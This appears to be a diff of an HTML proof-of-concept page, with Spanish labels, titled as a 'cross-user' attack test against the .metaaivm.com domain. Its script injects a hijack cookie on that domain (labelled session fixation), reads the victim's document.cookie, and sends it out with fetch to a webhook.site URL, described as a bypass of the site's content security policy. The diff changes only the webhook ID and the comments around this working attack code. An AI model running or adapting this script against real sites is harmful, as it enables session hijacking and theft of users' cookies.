@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prueba Cross-User Real + Consola</title>
+    <title>Prueba Cross-User Real</title>
     <style>
         body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #00ff00; }
         h1 { color: #fff; }
@@ -19,7 +19,7 @@
 
     <script>
         const consola = document.getElementById('console');
-        const webhookUrl = "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde";
+        const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
 
         function log(msg, className) {
             const line = document.createElement('div');
@@ -31,10 +31,10 @@
 
         log("Iniciando ataque Cross-User...", "info");
 
-        // 1. INYECCIÓN DE COOKIE
+        // 1. INYECCIÓN DE COOKIE (Session Fixation)
         try {
             document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
-            log("✅ Cookie inyectada en .metaaivm.com.", "success");
+            log("✅ Cookie inyectada en .metaaivm.com (Session Fixation).", "success");
         } catch (e) {
             log("❌ Error al inyectar cookie: " + e.message, "error");
         }
@@ -43,7 +43,7 @@
         const victimCookies = document.cookie;
         log("Cookies actuales en document.cookie: " + (victimCookies || "(vacío)"), "info");
 
-        // 3. EXFILTRACIÓN VÍA DATA URI
+        // 3. EXFILTRACIÓN VÍA DATA URI (Bypass del CSP)
         log("Preparando exfiltración vía Data URI...", "info");
         
         try {
@@ -63,7 +63,7 @@
                 .catch((e) => log("❌ Error en exfiltración: " + e.message, "error"));
 
         } catch (e) {
-            log("❌ Error al preparar exfiltración: " + e.message, "error");
+            log("❌ Error al exfiltrar: " + e.message, "error");
         }
 
         // 4. MOSTRAR ENTORNO
